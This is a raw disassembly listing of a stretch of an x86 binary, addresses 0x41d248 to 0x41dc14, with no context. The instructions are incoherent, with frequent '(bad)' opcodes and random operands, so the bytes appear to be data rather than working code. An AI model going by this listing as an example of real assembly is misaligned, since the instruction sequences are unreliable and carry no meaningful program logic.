  41d248:	test   BYTE PTR [eax],0x0
  41d24b:	add    BYTE PTR [esi],bh
  41d24d:	pop    edx
  41d24e:	and    ch,bl
  41d250:	test   BYTE PTR [eax],bh
  41d252:	mov    dh,bh
  41d254:	push   edx
  41d255:	sti    
  41d256:	push   edx
  41d257:	(bad)  
  41d258:	in     eax,0x94
  41d25a:	call   0x194dd530
  41d25f:	mov    eax,0x159619b3
  41d264:	dec    edx
  41d265:	rcr    DWORD PTR [edi],cl
  41d267:	jne    0x41d258
  41d269:	mov    ?,esi
  41d26b:	loop   0x41d253
  41d26d:	jnp    0x41d270
  41d26f:	ds (bad) 
  41d272:	mov    al,0xe1
  41d274:	add    ah,BYTE PTR [edi+0x22]
  41d277:	repz mov ds:0xdaa0c1a0,al
  41d27d:	sbb    edi,esp
  41d27f:	sub    BYTE PTR [ebx+0xa954b5a],ch
  41d285:	push   es
  41d286:	cld    
  41d287:	jne    0x41d221
  41d289:	std    
  41d28a:	push   0x769cf11b
  41d28f:	jle    0x41d23c
  41d291:	daa    
  41d292:	mov    al,0x21
  41d294:	retf   0x6e23
  41d297:	cmp    al,0xb9
  41d299:	in     eax,dx
  41d29a:	add    bl,ah
  41d29c:	ins    DWORD PTR es:[edi],dx
  41d29d:	sahf   
  41d29e:	xor    dh,BYTE PTR [edx]
  41d2a0:	pop    ebp
  41d2a1:	imul   esi,DWORD PTR [ecx-0x52b6bcc5],0xffffffb9
  41d2a8:	or     ebp,0xbfd17247
  41d2ae:	iret   
  41d2af:	div    DWORD PTR [esi+0x2e6b81db]
  41d2b5:	mov    gs,WORD PTR [esi]
  41d2b7:	jge    0x41d283
  41d2b9:	xchg   esp,eax
  41d2ba:	push   es
  41d2bb:	mov    ch,0xc8
  41d2bd:	(bad)  
  41d2be:	aam    0x80
  41d2c0:	jp     0x41d292
  41d2c2:	pop    edx
  41d2c3:	push   ecx
  41d2c4:	int    0x57
  41d2c6:	in     eax,0x21
  41d2c8:	add    ecx,ecx
  41d2ca:	nop
  41d2cb:	mov    esp,0x5c649fec
  41d2d0:	and    esp,DWORD PTR [ecx+0x10]
  41d2d3:	jge    0x41d341
  41d2d5:	dec    edx
  41d2d6:	cmp    eax,0xdd9124e2
  41d2db:	dec    edi
  41d2dc:	fsubr  QWORD PTR ds:[ebp+0x4b744406]
  41d2e3:	daa    
  41d2e4:	jp     0x41d2e1
  41d2e6:	dec    esp
  41d2e7:	mov    cl,0x13
  41d2e9:	mov    ch,0xdf
  41d2eb:	xor    ah,ch
  41d2ed:	and    esi,eax
  41d2ef:	fisub  DWORD PTR [esi+0x19]
  41d2f2:	mov    cs,edi
  41d2f4:	ins    DWORD PTR es:[edi],dx
  41d2f5:	sar    BYTE PTR [eax-0x7a],0x2a
  41d2f9:	ins    BYTE PTR es:[edi],dx
  41d2fa:	push   0xffffffcd
  41d2fc:	test   DWORD PTR [ecx+eiz*8+0x5535226a],esp
  41d303:	adc    al,0x44
  41d305:	enter  0xecba,0xd
  41d309:	cld    
  41d30a:	adc    ah,dh
  41d30c:	fiadd  DWORD PTR [eax+0x76]
  41d30f:	rcr    BYTE PTR [ecx-0x233d054f],1
  41d315:	adc    al,0x58
  41d317:	inc    edi
  41d318:	or     al,0xf1
  41d31a:	mov    ds:0x736fdfe1,al
  41d31f:	aad    0x17
  41d321:	jecxz  0x41d351
  41d323:	jnp    0x41d34d
  41d325:	dec    edx
  41d326:	and    ebp,ebx
  41d328:	arpl   WORD PTR ds:0x19915641,dx
  41d32e:	std    
  41d32f:	rcr    BYTE PTR [ecx+0x6a],0x37
  41d333:	daa    
  41d334:	lds    esi,FWORD PTR [ecx]
  41d336:	push   es
  41d337:	cli    
  41d338:	out    dx,al
  41d339:	inc    edi
  41d33a:	imul   ebp,DWORD PTR [edx],0xd8c8ef5e
  41d340:	cli    
  41d341:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  41d3b2:	add    BYTE PTR [eax],al
  41d3b4:	push   ebx
  41d3b5:	and    BYTE PTR [eax+0x5faef3ae],ah
  41d3bb:	std    
  41d3bc:	cmp    eax,0x4c
  41d3bf:	mov    BYTE PTR [eax],0x9f
  41d3c2:	in     eax,dx
  41d3c3:	ins    DWORD PTR es:[edi],dx
  41d3c4:	adc    bh,BYTE PTR [ebx]
  41d3c6:	add    DWORD PTR [eax],eax
  41d3c8:	test   BYTE PTR [eax],0x0
  41d3cb:	add    dh,dh
  41d3cd:	out    dx,eax
  41d3ce:	add    DWORD PTR [edi+ebp*2],edi
  41d3d1:	or     BYTE PTR [esp+eax*2+0x510fc343],dl
  41d3d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3d9:	adc    al,0x9
  41d3db:	ins    DWORD PTR es:[edi],dx
  41d3dc:	push   eax
  41d3dd:	dec    esp
  41d3de:	push   eax
  41d3df:	adc    DWORD PTR ds:0xb21967e4,edi
  41d3e5:	fwait
  41d3e6:	pop    edx
  41d3e7:	mov    eax,ds:0x2ffae4bd
  41d3ec:	enter  0x19c6,0xb
  41d3f0:	test   al,0xd5
  41d3f2:	add    BYTE PTR [ecx-0x19],0xc9
  41d3f6:	nop
  41d3f7:	jp     0x41d3e3
  41d3f9:	out    dx,al
  41d3fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3fb:	mov    al,0xc8
  41d3fd:	into   
  41d3fe:	ficom  DWORD PTR [edi+ebp*2-0x314515e]
  41d405:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d406:	adc    cl,BYTE PTR ds:0xb36c54
  41d40c:	sbb    BYTE PTR [ebx-0x30],bh
  41d40f:	mov    eax,edi
  41d411:	popf   
  41d412:	sub    eax,0xb06f11d5
  41d417:	scas   eax,DWORD PTR es:[edi]
  41d418:	repnz or DWORD PTR [edx],eax
  41d41b:	adc    ah,cl
  41d41d:	mov    ds,WORD PTR [ebx-0x3c]
  41d420:	xor    cl,dl
  41d422:	nop
  41d423:	rcr    DWORD PTR [eax+0x52],1
  41d426:	nop
  41d427:	popa   
  41d428:	adc    dh,BYTE PTR [edx]
  41d42a:	push   ebx
  41d42b:	test   BYTE PTR [edi+0x4b],0x18
  41d42f:	push   eax
  41d430:	clc    
  41d431:	fimul  WORD PTR [eax]
  41d433:	push   0x4d
  41d435:	and    ecx,DWORD PTR es:[ebx+0x4e]
  41d439:	cld    
  41d43a:	sub    dh,BYTE PTR [ecx-0x55]
  41d43d:	fbld   TBYTE PTR [ebx+0x7b2733ac]
  41d443:	mov    ecx,0xf99099b6
  41d448:	and    cl,BYTE PTR ds:0x2909a53c
  41d44e:	mov    bh,0xbf
  41d450:	or     al,0xcb
  41d452:	mov    eax,ds:0x83253113
  41d457:	push   eax
  41d458:	pop    ecx
  41d459:	lock inc edi
  41d45b:	call   0x52332abb
  41d460:	sbb    bl,dh
  41d462:	stc    
  41d463:	mov    dh,0xbb
  41d465:	imul   esi,DWORD PTR [ecx+0x6cb7c215],0x68
  41d46c:	xchg   ecx,eax
  41d46d:	loope  0x41d41a
  41d46f:	out    dx,al
  41d470:	push   ebp
  41d471:	inc    eax
  41d472:	jne    0x41d498
  41d474:	icebp  
  41d475:	stos   DWORD PTR es:[edi],eax
  41d476:	jecxz  0x41d4dc
  41d478:	jecxz  0x41d4e9
  41d47a:	and    BYTE PTR [ebx+0x68db8574],0x57
  41d481:	push   esi
  41d482:	addr16 in eax,0xbc
  41d485:	cmp    edi,DWORD PTR [ebp+ebp*4-0x1]
  41d489:	cld    
  41d48a:	mov    dh,0xf3
  41d48c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d48d:	std    
  41d48e:	sti    
  41d48f:	sbb    BYTE PTR [edx+0x58],bh
  41d492:	add    al,0xff
  41d494:	retf   
  41d495:	jae    0x41d483
  41d497:	pop    ecx
  41d498:	(bad)  
  41d499:	(bad)  
  41d49b:	inc    ecx
  41d49c:	shr    BYTE PTR [edx],1
  41d49e:	inc    ecx
  41d49f:	add    al,0x27
  41d4a1:	cli    
  41d4a2:	fidiv  DWORD PTR [ebp+ebp*8-0x3418d83b]
  41d4a9:	pop    es
  41d4aa:	repnz or al,0x21
  41d4ad:	in     eax,0x9c
  41d4af:	mov    ds:0x49ba7b5b,eax
  41d4b4:	mov    WORD PTR [eax-0x5c1d71e9],?
  41d4ba:	jge    0x41d4ab
  41d4bc:	shl    BYTE PTR [eax],cl
  41d4be:	cmp    al,0x29
  41d4c0:	lds    edx,FWORD PTR [eax+0x0]
	...
  41d533:	add    ch,al
  41d535:	and    edx,DWORD PTR [ecx-0xa4808db]
  41d53b:	jecxz  0x41d58e
  41d53d:	or     edi,DWORD PTR [edx+ecx*8-0x7a18a0e3]
  41d544:	or     BYTE PTR [ecx+eax*1],bh
  41d547:	add    dh,dh
  41d549:	add    BYTE PTR [eax],al
  41d54b:	add    BYTE PTR [edi-0x3709de6e],bh
  41d551:	xchg   esi,eax
  41d552:	mov    ss,ecx
  41d554:	icebp  
  41d555:	lods   al,BYTE PTR ds:[esi]
  41d556:	out    dx,eax
  41d557:	rcr    DWORD PTR [esi+0x325366b6],1
  41d55d:	dec    eax
  41d55e:	adc    eax,0x6d344ba3
  41d563:	ja     0x41d51d
  41d565:	repnz sbb al,0x6b
  41d568:	pop    edx
  41d569:	mov    WORD PTR [edi+0x236568a7],fs
  41d56f:	add    bl,BYTE PTR [ebp-0x3ba880a9]
  41d575:	ror    BYTE PTR [ecx+0x6ceace6c],1
  41d57b:	ins    BYTE PTR es:[edi],dx
  41d57c:	ins    DWORD PTR es:[edi],dx
  41d57d:	mov    ecx,0x3a3b2f3
  41d582:	add    BYTE PTR [edi+0x116b15cd],0x43
  41d589:	test   DWORD PTR [edx],esi
  41d58b:	push   ss
  41d58c:	(bad)  
  41d58d:	rcr    ah,1
  41d58f:	out    0x5f,al
  41d591:	cmp    eax,DWORD PTR [edx+0x6f]
  41d594:	sbb    BYTE PTR [edi-0x5597ddc7],bh
  41d59a:	xchg   edx,eax
  41d59b:	ja     0x41d5a3
  41d59d:	stc    
  41d59e:	(bad)  
  41d59f:	add    esp,edi
  41d5a1:	mov    eax,0x7472889f
  41d5a6:	data16 fild WORD PTR [ebp-0x6e91f7d2]
  41d5ad:	xor    al,0xa7
  41d5af:	pushf  
  41d5b0:	push   eax
  41d5b1:	inc    BYTE PTR [esi+ebx*2]
  41d5b4:	nop
  41d5b5:	dec    ebx
  41d5b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5b7:	pop    esi
  41d5b8:	fist   DWORD PTR [eax]
  41d5ba:	or     eax,0x5c671319
  41d5bf:	test   eax,0x578502b4
  41d5c4:	fistp  QWORD PTR es:[esi+0x28d1067d]
  41d5cc:	dec    esp
  41d5cd:	push   cs
  41d5ce:	into   
  41d5cf:	xchg   BYTE PTR [esi-0x69],cl
  41d5d2:	das    
  41d5d3:	xchg   esp,edx
  41d5d5:	xor    eax,0x80fc184c
  41d5da:	push   eax
  41d5db:	mov    ah,0x89
  41d5dd:	clc    
  41d5de:	pop    edi
  41d5df:	or     esp,ebx
  41d5e1:	shr    BYTE PTR [edx-0x33],1
  41d5e4:	and    DWORD PTR [eax],ebp
  41d5e6:	cs mov esi,0x27e1f692
  41d5ec:	aam    0xc
  41d5ee:	push   eax
  41d5ef:	iret   
  41d5f0:	sbb    edx,DWORD PTR ds:0xea323f2
  41d5f6:	ds jecxz 0x41d5f7
  41d5f9:	cld    
  41d5fa:	cmp    eax,0x13b72c52
  41d5ff:	jae    0x41d640
  41d601:	out    dx,al
  41d602:	fbld   TBYTE PTR [ebx+edx*1]
  41d606:	in     al,0x81
  41d608:	xchg   edx,eax
  41d609:	mov    dh,BYTE PTR [eax-0x3e4281b4]
  41d60f:	shl    edi,cl
  41d611:	jp     0x41d5d8
  41d613:	pushf  
  41d614:	out    dx,eax
  41d615:	aaa    
  41d616:	lds    ecx,FWORD PTR [edx-0x17]
  41d619:	jmp    0x8acf70df
  41d61e:	pop    eax
  41d61f:	ins    BYTE PTR es:[edi],dx
  41d620:	pop    es
  41d621:	xor    BYTE PTR [ecx],dl
  41d623:	push   edi
  41d624:	jne    0x41d63b
  41d626:	push   ecx
  41d627:	cmp    ebp,edi
  41d629:	cwde   
  41d62a:	xchg   esp,eax
  41d62b:	adc    edx,esp
  41d62d:	jmp    0x3fda:0xb0943fbc
  41d634:	pop    ebx
  41d635:	mov    es:0xb110d5eb,eax
  41d63b:	pop    ss
  41d63c:	outs   dx,BYTE PTR ds:[esi]
  41d63d:	scas   al,BYTE PTR es:[edi]
  41d63e:	sahf   
  41d63f:	jno    0x41d6bc
  41d641:	jl     0x41d643
	...
  41d6b3:	add    dl,bl
  41d6b5:	add    edx,eax
  41d6b7:	xchg   bl,bl
  41d6b9:	(bad)  
  41d6ba:	ficomp WORD PTR [ebp+0x8]
  41d6bd:	push   0xf2320a3b
  41d6c2:	dec    ebx
  41d6c3:	ja     0x41d6c3
  41d6c5:	cmp    al,0x1
  41d6c7:	add    dh,dh
  41d6c9:	add    BYTE PTR [eax],al
  41d6cb:	add    BYTE PTR [eax+0x4d5d7e71],dh
  41d6d1:	sbb    esp,DWORD PTR [ecx+eax*1]
  41d6d4:	addr16 cmp al,0x96
  41d6d7:	not    DWORD PTR [ecx+ebx*2]
  41d6da:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6dc:	jg     0x7509b690
  41d6e2:	mov    dl,0xbb
  41d6e4:	push   es
  41d6e5:	add    eax,0x1f7a7d63
  41d6ea:	sub    DWORD PTR [edx-0x27],ebx
  41d6ed:	bound  edx,QWORD PTR [ebx+0x2e]
  41d6f0:	cdq    
  41d6f1:	mov    BYTE PTR [ecx+0x102a92d8],dl
  41d6f7:	scas   al,BYTE PTR es:[edi]
  41d6f8:	adc    esp,DWORD PTR [edx+0x204ad9cb]
  41d6fe:	jp     0x41d72f
  41d700:	fst    DWORD PTR ds:0xd8234eec
  41d706:	in     al,dx
  41d707:	or     al,0xc1
  41d709:	xlat   BYTE PTR ds:[ebx]
  41d70a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d70b:	cmp    dh,BYTE PTR [eax-0x73]
  41d70e:	mov    esi,DWORD PTR ds:0xb6f772f2
  41d714:	in     al,dx
  41d715:	xchg   ebx,eax
  41d716:	loop   0x41d775
  41d718:	lds    ebp,FWORD PTR [esi-0x35]
  41d71b:	loopne 0x41d6d6
  41d71d:	adc    DWORD PTR [ebx-0x26],ebx
  41d720:	cli    
  41d721:	stos   DWORD PTR es:[edi],eax
  41d722:	mov    bh,0x5a
  41d724:	push   esp
  41d725:	jg     0x41d74c
  41d727:	mov    eax,ds:0xc13606e5
  41d72c:	fcmovnbe st,st(2)
  41d72e:	xor    cl,BYTE PTR [ebp-0x4d541583]
  41d734:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d735:	xor    ch,al
  41d737:	dec    esi
  41d738:	fldcw  WORD PTR [ebp+0x37]
  41d73b:	sahf   
  41d73c:	std    
  41d73d:	dec    ebp
  41d73e:	inc    ecx
  41d73f:	pmulhw mm0,QWORD PTR [eax-0x16]
  41d743:	dec    esi
  41d744:	add    ebp,0xc304a3ea
  41d74a:	(bad)  
  41d74b:	out    dx,eax
  41d74c:	sbb    BYTE PTR [ebp+ecx*1-0x3e],bh
  41d750:	sub    ah,0xa4
  41d753:	push   0x55
  41d755:	lahf   
  41d756:	shr    BYTE PTR [ebp-0x32],0x9a
  41d75a:	mov    al,ds:0xbcf46242
  41d75f:	jnp    0x41d776
  41d761:	ss cmp eax,0x1269eb15
  41d767:	jae    0x41d7c2
  41d769:	nop
  41d76a:	xchg   edx,eax
  41d76b:	adc    al,0x2f
  41d76d:	xor    ebp,DWORD PTR [ebx]
  41d76f:	jnp    0x41d752
  41d771:	lds    ebp,FWORD PTR [edx-0x73]
  41d774:	bound  ebx,QWORD PTR [edx]
  41d776:	dec    esi
  41d777:	pop    ss
  41d778:	xlat   BYTE PTR ds:[ebx]
  41d779:	out    0x6c,eax
  41d77b:	jne    0x41d78c
  41d77d:	xchg   ecx,eax
  41d77e:	and    al,0xbf
  41d780:	xor    BYTE PTR [edi+0x6b],bh
  41d783:	dec    esi
  41d784:	dec    eax
  41d785:	mov    bh,0xe2
  41d787:	jg     0x41d773
  41d789:	fsub   st(2),st
  41d78b:	imul   edx,ebp,0x3
  41d78e:	push   0xffffffdc
  41d790:	xor    eax,0x8fd76d21
  41d795:	cs dec edi
  41d797:	out    0xba,al
  41d799:	xchg   esp,eax
  41d79a:	loope  0x41d804
  41d79c:	dec    eax
  41d79d:	(bad)  
  41d79e:	sbb    eax,0xee8a95af
  41d7a3:	sbb    cl,dl
  41d7a5:	xlat   BYTE PTR ds:[ebx]
  41d7a6:	push   ebx
  41d7a7:	ja     0x41d79d
  41d7a9:	mov    edi,DWORD PTR [eax+0x5ec68c50]
  41d7af:	xor    WORD PTR [eax],bx
  41d7b2:	add    bl,BYTE PTR [ebp-0x2f3ccaf9]
  41d7b8:	dec    edx
  41d7b9:	inc    ecx
  41d7ba:	std    
  41d7bb:	test   DWORD PTR [eax+ebx*8+0x239ddc49],ecx
	...
  41d832:	add    BYTE PTR [eax],al
  41d834:	arpl   WORD PTR [ebp*4-0x44200cc],si
  41d83b:	ja     0x41d7c4
  41d83d:	repnz pop es
  41d83f:	add    eax,DWORD PTR [esi]
  41d841:	jecxz  0x41d855
  41d843:	icebp  
  41d844:	hlt    
  41d845:	cmp    eax,0xf60001
  41d84a:	add    BYTE PTR [eax],al
  41d84c:	scas   eax,DWORD PTR es:[edi]
  41d84d:	mov    WORD PTR [edi+edx*4-0x2213694f],?
  41d854:	aaa    
  41d855:	loopne 0x41d7ed
  41d857:	jmp    0x41d7f2
  41d859:	pushf  
  41d85a:	cli    
  41d85b:	pusha  
  41d85c:	xchg   edi,eax
  41d85d:	inc    edx
  41d85e:	push   eax
  41d85f:	test   bl,dh
  41d861:	(bad)  
  41d863:	sahf   
  41d864:	mov    ds,ecx
  41d866:	jno    0x41d852
  41d868:	int    0xc8
  41d86a:	jno    0x41d7fb
  41d86c:	sub    dl,BYTE PTR [ecx]
  41d86e:	or     BYTE PTR [edi],al
  41d870:	fstp   DWORD PTR [edx-0x30]
  41d873:	iret   
  41d874:	fmul   DWORD PTR [ecx+ebp*4]
  41d877:	mov    ds:0x96d3f4f5,al
  41d87c:	xlat   BYTE PTR ds:[ebx]
  41d87d:	ja     0x41d8bb
  41d87f:	popa   
  41d880:	(bad)  
  41d882:	push   0x9333ff31
  41d887:	xchg   edi,eax
  41d888:	stos   BYTE PTR es:[edi],al
  41d889:	xor    ah,BYTE PTR [edi-0x22]
  41d88c:	dec    ecx
  41d88d:	or     esi,DWORD PTR [ebx+ebx*1-0x21]
  41d891:	popa   
  41d892:	xchg   esi,eax
  41d893:	inc    edi
  41d894:	xor    al,BYTE PTR [esi+0x77]
  41d897:	sbb    al,0xc8
  41d899:	push   ebp
  41d89a:	jmp    0x415d6fe4
  41d89f:	loop   0x41d8ed
  41d8a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8a2:	and    eax,DWORD PTR [ebx+0x20]
  41d8a5:	pop    eax
  41d8a6:	adc    esp,DWORD PTR [edi]
  41d8a8:	inc    ebx
  41d8a9:	mov    dh,0x38
  41d8ab:	jo     0x41d905
  41d8ad:	push   ecx
  41d8ae:	adc    al,0xaf
  41d8b0:	dec    ecx
  41d8b1:	stc    
  41d8b2:	inc    ebp
  41d8b3:	push   edi
  41d8b4:	(bad)  
  41d8b5:	xor    bh,BYTE PTR [ebp+0x7b86e2]
  41d8bb:	pusha  
  41d8bc:	jb     0x41d924
  41d8be:	frstor [ebx]
  41d8c0:	cmc    
  41d8c1:	xchg   esp,eax
  41d8c2:	out    dx,eax
  41d8c3:	retf   0xfdb3
  41d8c6:	popa   
  41d8c7:	sbb    eax,0x35ecbff2
  41d8cc:	xchg   esi,eax
  41d8cd:	fxch   st(7)
  41d8cf:	jae    0x41d894
  41d8d1:	and    DWORD PTR [eax],0xffffffd6
  41d8d4:	stos   DWORD PTR es:[edi],eax
  41d8d5:	pop    ds
  41d8d6:	clc    
  41d8d7:	adc    ch,bh
  41d8d9:	cs pushf 
  41d8db:	pop    es
  41d8dc:	(bad)  
  41d8dd:	mov    edx,ecx
  41d8df:	xchg   edi,eax
  41d8e0:	adc    edx,ecx
  41d8e2:	daa    
  41d8e3:	jb     0x41d95f
  41d8e5:	dec    esp
  41d8e6:	ds stos BYTE PTR es:[edi],al
  41d8e8:	inc    ebx
  41d8e9:	inc    ecx
  41d8ea:	sbb    dh,BYTE PTR [ebp-0x2a]
  41d8ed:	fdivr  DWORD PTR [ecx+eiz*1]
  41d8f0:	adc    DWORD PTR [ebp-0xd],0xffffffd5
  41d8f4:	shr    DWORD PTR [edi],1
  41d8f6:	adc    al,0xae
  41d8f8:	xor    eax,0xeda3735d
  41d8fd:	push   ecx
  41d8fe:	test   al,0xd6
  41d900:	dec    ebp
  41d901:	push   esi
  41d902:	lds    ebp,FWORD PTR [edx+0x2c]
  41d905:	repnz add DWORD PTR [ebp+0x6c6f920a],edx
  41d90c:	add    al,0x13
  41d90e:	out    0xb9,eax
  41d910:	cmc    
  41d911:	cmp    BYTE PTR [esi+0x426db01b],bh
  41d917:	mov    esp,0xebaee87c
  41d91c:	pop    esp
  41d91d:	xor    eax,esp
  41d91f:	or     BYTE PTR [edi-0x7df8e242],cl
  41d925:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d926:	cmp    DWORD PTR [esi+0x2757b651],ebp
  41d92c:	xchg   ebx,eax
  41d92d:	cmp    BYTE PTR ds:0x76008fcb,0xcd
  41d934:	imul   edi,DWORD PTR [edi+0x38],0xffffffc3
  41d938:	maskmovq mm5,mm6
  41d93b:	cmp    al,0xc5
  41d93d:	sub    bl,dh
  41d93f:	scas   eax,DWORD PTR es:[edi]
  41d940:	test   dh,dl
	...
  41d9b2:	add    BYTE PTR [eax],al
  41d9b4:	lock retf 0xfc94
  41d9b8:	mov    esi,0xfdcef8fe
  41d9bd:	cwde   
  41d9be:	sbb    eax,0x788661c
  41d9c3:	(bad)  
  41d9c4:	jmp    0x0:0xf600013e
  41d9cb:	add    BYTE PTR [edi],ch
  41d9cd:	push   cs
  41d9ce:	lahf   
  41d9cf:	aad    0x64
  41d9d1:	jmp    0x4a2f63d8
  41d9d6:	fsubr  QWORD PTR [edi+0x15]
  41d9d9:	adc    edx,DWORD PTR [ecx-0x7b7a69]
  41d9df:	repz data16 (bad) 
  41d9e2:	shl    DWORD PTR [ebx],1
  41d9e4:	or     edi,esi
  41d9e6:	xor    eax,0x57236159
  41d9eb:	daa    
  41d9ec:	out    dx,al
  41d9ed:	int    0xb0
  41d9ef:	in     eax,dx
  41d9f0:	pop    edx
  41d9f1:	push   esp
  41d9f2:	mov    ds:0xaf011637,eax
  41d9f7:	clc    
  41d9f8:	xchg   ebx,eax
  41d9f9:	out    0x24,al
  41d9fb:	and    ah,BYTE PTR [esi]
  41d9fd:	and    al,0x9
  41d9ff:	sub    BYTE PTR [ecx],0x44
  41da02:	push   0x1f
  41da04:	jl     0x41da6f
  41da06:	dec    esp
  41da07:	lods   al,BYTE PTR ds:[esi]
  41da08:	xlat   BYTE PTR ds:[ebx]
  41da09:	leave  
  41da0a:	fwait
  41da0b:	test   BYTE PTR [eax+0x4b],0x8a
  41da0f:	fnstsw WORD PTR [edi-0x6668503a]
  41da15:	stos   BYTE PTR es:[edi],al
  41da16:	cmp    eax,0x3c22774c
  41da1b:	mov    dl,0xe3
  41da1d:	addr16 pop esi
  41da1f:	dec    ecx
  41da20:	out    dx,eax
  41da21:	ins    BYTE PTR es:[edi],dx
  41da22:	mov    bh,0xc0
  41da24:	ins    BYTE PTR es:[edi],dx
  41da25:	jecxz  0x41da85
  41da27:	in     al,dx
  41da28:	rol    DWORD PTR [ebx-0x70],cl
  41da2b:	push   edi
  41da2c:	sahf   
  41da2d:	and    eax,0xbd26d71e
  41da32:	fnstsw WORD PTR [edi+0x18]
  41da35:	aas    
  41da36:	mov    ds:0xe85a8ee8,eax
  41da3b:	hlt    
  41da3c:	mov    al,ds:0x3021c55f
  41da41:	lods   eax,DWORD PTR ds:[esi]
  41da42:	scas   al,BYTE PTR es:[edi]
  41da43:	jmp    0x41da71
  41da45:	sub    ah,BYTE PTR [esi-0x8]
  41da48:	xor    bl,ah
  41da4a:	sbb    DWORD PTR [ecx-0x21104a28],0x7e06eeb
  41da54:	fisub  WORD PTR [edx-0x7627f14a]
  41da5a:	jecxz  0x41da7c
  41da5c:	push   ebx
  41da5d:	sar    BYTE PTR [ebp-0x34],cl
  41da60:	dec    ecx
  41da61:	test   BYTE PTR [esi-0x7f],ah
  41da64:	adc    BYTE PTR [ebx-0x20],cl
  41da67:	out    dx,al
  41da68:	mov    DWORD PTR [eax],ebp
  41da6a:	sub    BYTE PTR [ebx+0x49],bh
  41da6d:	xor    al,0x8a
  41da6f:	or     ecx,DWORD PTR [ebx-0xe48eb58]
  41da75:	and    esi,DWORD PTR [ecx-0x1a]
  41da78:	push   ebx
  41da79:	in     eax,dx
  41da7a:	sub    ebp,0x730a06da
  41da80:	cli    
  41da81:	into   
  41da82:	inc    edx
  41da83:	aam    0xd9
  41da85:	call   DWORD PTR ds:0x912d9753
  41da8b:	adc    dh,BYTE PTR [ebx+0x28d48bc7]
  41da91:	(bad)  
  41da92:	jno    0x41da3a
  41da94:	mov    esi,0x795c2676
  41da99:	shl    DWORD PTR [edi+0x3abffc71],1
  41da9f:	pop    es
  41daa0:	inc    eax
  41daa1:	loopne 0x41da5e
  41daa3:	imul   ecx,edx,0x0
  41daa6:	mov    esp,0x46b7450d
  41daab:	outs   dx,DWORD PTR ds:[esi]
  41daac:	(bad)  
  41daad:	cmp    ah,BYTE PTR [eax-0x46]
  41dab0:	adc    DWORD PTR [eax],ebx
  41dab2:	(bad)  
  41dab3:	fisttp WORD PTR [eax-0x5f7936f8]
  41dab9:	aad    0x4f
  41dabb:	sub    DWORD PTR [ecx-0x77],0xffffff90
  41dabf:	and    esp,DWORD PTR [ecx+0x8d]
	...
  41db31:	add    BYTE PTR [eax],al
  41db33:	add    BYTE PTR [ecx],ch
  41db35:	(bad)  
  41db36:	sti    
  41db37:	pop    ebp
  41db38:	(bad)  
  41db39:	jge    0x41daea
  41db3b:	div    dl
  41db3d:	cmp    ebp,0xb
  41db40:	push   eax
  41db41:	clc    
  41db42:	push   ebx
  41db43:	int3   
  41db44:	loopne 0x41db85
  41db46:	add    DWORD PTR [eax],eax
  41db48:	test   BYTE PTR [eax],0x0
  41db4b:	add    BYTE PTR [edx+0x218f00b5],dh
  41db51:	xchg   BYTE PTR [ebp-0x1c],cl
  41db54:	xor    edx,DWORD PTR [edi+0x40]
  41db57:	xchg   ebx,eax
  41db58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db59:	ja     0x41db55
  41db5b:	jb     0x41db5c
  41db5d:	out    0x66,al
  41db5f:	sar    DWORD PTR [eax-0x69],1
  41db62:	repnz rcr BYTE PTR [ebp+0x362980ad],0xb3
  41db6a:	xor    BYTE PTR [edi],bh
  41db6c:	out    dx,al
  41db6d:	dec    ecx
  41db6e:	mov    al,ds:0xc510bb22
  41db73:	sbb    DWORD PTR [edx-0x43],0xb41f4109
  41db7a:	inc    eax
  41db7b:	sub    BYTE PTR gs:0x9036ea4b,bh
  41db82:	mov    ds:0x7adfd54b,al
  41db87:	imul   ebp,DWORD PTR [ebp-0x66],0x6e
  41db8b:	sub    esp,DWORD PTR [eax+ebp*8+0x0]
  41db8f:	shr    DWORD PTR ds:0x640af132,cl
  41db95:	(bad)  
  41db96:	int    0x77
  41db98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db99:	(bad)  
  41db9a:	not    edx
  41db9c:	aad    0x2a
  41db9e:	jp     0x41dc11
  41dba0:	xor    al,0x6e
  41dba2:	xchg   ch,al
  41dba4:	int    0x6
  41dba6:	lock test DWORD PTR [bp+si+0x65],ecx
  41dbab:	push   0x8687bfae
  41dbb0:	mov    esi,0xf94fb5c3
  41dbb5:	mov    ds:0x30a0e3ec,al
  41dbba:	fdivr  st,st(7)
  41dbbc:	add    eax,0x4052e425
  41dbc1:	jne    0x41dbfd
  41dbc3:	sbb    eax,0x7e0ac642
  41dbc8:	ds sub al,0xbb
  41dbcb:	push   esi
  41dbcc:	mov    ch,0x7a
  41dbce:	lods   eax,DWORD PTR ds:[esi]
  41dbcf:	adc    al,0x6d
  41dbd1:	sub    eax,0xa2ee9ab1
  41dbd6:	outs   dx,BYTE PTR ds:[esi]
  41dbd7:	inc    edi
  41dbd8:	leave  
  41dbd9:	push   ds
  41dbda:	cmp    al,BYTE PTR [ecx-0x14]
  41dbdd:	xlat   BYTE PTR ds:[ebx]
  41dbde:	clc    
  41dbdf:	inc    eax
  41dbe0:	fdiv   QWORD PTR [ebp+0x3f157d24]
  41dbe6:	les    esi,FWORD PTR [ecx]
  41dbe8:	push   0x23a535fd
  41dbed:	fdiv   st(7),st
  41dbef:	adc    bl,ch
  41dbf1:	loopne 0x41dbd8
  41dbf3:	out    0xec,al
  41dbf5:	loopne 0x41db9b
  41dbf7:	adc    edx,0xffffffcb
  41dbfa:	dec    esp
  41dbfb:	cdq    
  41dbfc:	mov    cl,0x7c
  41dbfe:	arpl   ax,dx
  41dc00:	sub    al,0xaa
  41dc02:	mov    al,ds:0x8d819032
  41dc07:	push   esp
  41dc08:	add    al,0x5
  41dc0a:	mov    dh,0x83
  41dc0c:	es ror bh,cl
  41dc0f:	mov    ds:0x214ba48b,al
  41dc14:	and    eax,0x6a309ad7
